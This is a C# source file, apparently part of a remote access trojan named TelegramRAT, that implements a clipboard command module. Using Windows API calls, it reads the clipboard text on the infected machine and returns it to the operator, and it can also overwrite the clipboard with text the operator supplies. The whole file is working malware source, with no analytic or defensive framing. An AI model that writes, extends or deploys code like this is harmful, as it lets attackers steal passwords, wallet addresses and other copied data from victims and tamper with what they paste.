namespace TelegramRAT.Commands;

using System.Runtime.InteropServices;
using TelegramRAT.Models;

internal sealed class ClipboardCmd : IAsyncCommand
{
    public Task<CommandResult> ExecuteAsync(string[] args)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return Task.FromResult(CommandResult.Text("Clipboard requires Windows"));

        if (args.Length > 0 && args[0].ToLowerInvariant() == "set")
        {
            var text = string.Join(" ", args[1..]);
            SetClipboardText(text);
            return Task.FromResult(CommandResult.Text("Clipboard set"));
        }

        var content = GetClipboardText();
        return Task.FromResult(CommandResult.Text(
            string.IsNullOrEmpty(content) ? "(clipboard empty)" : content));
    }

    private static string GetClipboardText()
    {
        string result = "";
        var thread = new Thread(() =>
        {
            if (OpenClipboard(IntPtr.Zero))
            {
                var handle = GetClipboardData(13);
                if (handle != IntPtr.Zero)
                {
                    var ptr = GlobalLock(handle);
                    if (ptr != IntPtr.Zero)
                    {
                        result = Marshal.PtrToStringUni(ptr) ?? "";
                        GlobalUnlock(handle);
                    }
                }
                CloseClipboard();
            }
        });
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join(3000);
        return result;
    }

    private static void SetClipboardText(string text)
    {
        var thread = new Thread(() =>
        {
            if (OpenClipboard(IntPtr.Zero))
            {
                EmptyClipboard();
                var hGlobal = Marshal.StringToHGlobalUni(text);
                SetClipboardData(13, hGlobal);
                CloseClipboard();
            }
        });
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join(3000);
    }

    [DllImport("user32.dll")] private static extern bool OpenClipboard(IntPtr hWndNewOwner);
    [DllImport("user32.dll")] private static extern bool CloseClipboard();
    [DllImport("user32.dll")] private static extern bool EmptyClipboard();
    [DllImport("user32.dll")] private static extern IntPtr GetClipboardData(uint uFormat);
    [DllImport("user32.dll")] private static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);
    [DllImport("kernel32.dll")] private static extern IntPtr GlobalLock(IntPtr hMem);
    [DllImport("kernel32.dll")] private static extern bool GlobalUnlock(IntPtr hMem);
}
